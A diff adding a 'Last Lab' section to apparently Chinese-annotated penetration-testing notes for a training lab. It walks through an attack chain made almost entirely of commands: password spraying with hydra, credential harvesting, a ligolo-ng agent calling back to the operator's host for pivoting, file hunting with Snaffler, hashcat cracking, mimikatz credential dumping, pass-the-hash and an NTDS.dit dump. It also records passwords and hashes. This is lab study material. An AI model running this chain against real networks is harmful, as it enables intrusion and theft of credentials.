@@ -590,3 +590,53 @@ evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local          登录
 
 生成强密码
   https://1password.com/password-generator
+
+
+Last Lab
+
+nmap 10.129.234.116
+git clone https://github.com/urbanadventurer/username-anarchy.git && cd username-anarchy                              下载工具
+./username-anarchy Betty Jayde > user.list                                                                            用 Betty Jayde 生成一个用户列表
+hydra -L user.list -p 'Texas123!@#' ssh://10.129.234.116                                                              密码喷洒 ssh，获得 jbetty:Texas123!@#
+ssh jbetty@10.129.234.116
+jbetty@DMZ01:~$ grep 'pass' -r /home/ 2>/dev/null                                                                     获得 sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01
+wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz      下载工具
+wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
+tar -xvzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
+tar -xvzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
+python3 -m http.server
+jbetty@DMZ01:~$ wget http://PWNIP:8000/agent
+sudo ./proxy -selfcert
+jbetty@DMZ01:~$ chmod +x ./agent
+jbetty@DMZ01:~$ ./agent -connect 10.10.14.209:11601 --ignore-cert
+ligolo-ng » session
+ligolo-ng » 1
+ligolo-ng » autoroute
+
+cat << EOF > hosts
+172.16.119.13
+172.16.119.7
+172.16.119.10
+172.16.119.11
+EOF
+
+nxc rdp hosts -u hwilliam -p 'dealer-screwed-gym1'       验证 RDP 凭据
+xfreerdp /v:172.16.119.7 /u:hwilliam /p:'dealer-screwed-gym1' /dynamic-resolution /drive:linux,当前路径
+wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.198/Snaffler.exe                      下载工具
+nxc smb hosts -u hwilliam -p 'dealer-screwed-gym1' --shares                                            验证 SMB 凭据
+把 Snaffler.exe 复制到桌面，并运行
+C:\Users\hwilliam\Desktop\Snaffler.exe -u -s -n FILE01.nexura.htb                                      发现文件 Employee-Passwords_OLD.psafe3
+smbclient -U nexura.htb\\hwilliam '\\172.16.119.10\HR'
+smb:> cd Archive
+smb:> get Employee-Passwords_OLD.psafe3
+hashcat --example-hashes | grep -i safe -A                                             找 mode，确认 5200
+hashcat -m 5200 Employee-Passwords_OLD.psafe3 /usr/share/wordlists/rockyou.txt.gz      破解 Employee-Passwords_OLD.psafe3，密码：michaeljackson
+打开 psafe3 文件，获得 bdavid:caramel-cigars-reply1 和 stom:fails-nibble-disturb4
+nxc winrm hosts -u bdavid -p 'caramel-cigars-reply1'                                    验证 WinRM
+nxc rdp 172.16.119.7 -u bdavid -p 'caramel-cigars-reply1'                               验证 RDP
+xfreerdp /v:172.16.119.7 /u:bdavid /p:'caramel-cigars-reply1' /dynamic-resolution /drive:linux,当前路径
+把 mimikatz.exe 复制到桌面，并运行
+C:\Users\bdavid\Desktop\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit            获得 NTLM:21ea958524cfd9a7791737f8d2f764fa
+nxc smb hosts -u stom -H 21ea958524cfd9a7791737f8d2f764fa                                          用自建的 hosts 喷洒
+nxc smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa --ntds --user Administrator      dump NTDS.dit
+拿到 Administrator:500:aad3b435b51404eeaad3b435b51404ee:36e09e1e6ade94d63fbcab5e5b8d6d23:::        最后一个就是 NTLM 哈希
